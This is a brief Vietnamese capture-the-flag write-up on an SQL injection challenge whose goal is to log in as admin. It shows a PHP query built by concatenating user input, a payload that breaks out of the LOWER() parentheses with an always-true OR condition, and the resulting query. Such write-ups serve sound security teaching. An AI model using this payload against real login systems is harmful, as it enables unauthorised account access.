# SQL Injection 3
# Mục tiêu: Login as admin
# 🔥 Phân tích lỗ hổng
```
$sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
```
* ở đây cần thoát khỏi ngoặc:
```
admin") or ("1"="1 
```
Tương đương
```
SELECT * FROM users WHERE username=LOWER("admin") or ("1"="1") AND password=MD5("abc")
```